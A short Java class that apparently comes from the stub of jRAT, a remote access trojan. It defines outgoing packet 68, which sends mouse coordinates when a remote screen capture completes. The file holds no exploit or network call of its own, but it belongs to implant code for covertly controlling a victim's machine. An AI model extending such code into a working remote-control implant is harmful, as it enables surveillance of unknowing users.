package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet68RemoteScreenComplete extends AbstractOutgoingPacket {

	private int mouseX;
	private int mouseY;
	
	public Packet68RemoteScreenComplete(int mouseX, int mouseY) {
		this.mouseX = mouseX;
		this.mouseY = mouseY;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(mouseX);
		dos.writeInt(mouseY);
	}

	@Override
	public byte getPacketId() {
		return (byte) 68;
	}
}
